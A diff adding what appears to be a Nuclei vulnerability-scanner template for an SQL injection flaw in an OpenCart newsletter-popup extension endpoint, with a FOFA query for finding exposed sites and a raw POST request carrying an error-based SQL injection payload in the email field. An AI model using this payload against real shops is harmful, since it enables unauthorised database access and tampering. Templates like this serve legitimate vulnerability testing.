@@ -1,0 +1,27 @@
+id: opencart-sql-injection-extension
+
+info:
+  name: OpenCart电子商务建站系统extension接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="extension/module/so_newletter_custom_popup/newsletter"
+          OpenCart系统在处理extension模块接口请求时，其参数传递机制未正确过滤SQL特殊字符，导致攻击者可通过构造恶意SQL语句实现数据库内容篡改，包括但不限于记录的增删改操作，进而导致数据完整性受损或服务中断。
+  tags: OpenCart电子商务建站系统
+
+http:
+- raw:
+  - |
+    POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    createdate=2024-5-15 09:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'cb962ac59075b964b07152d23'
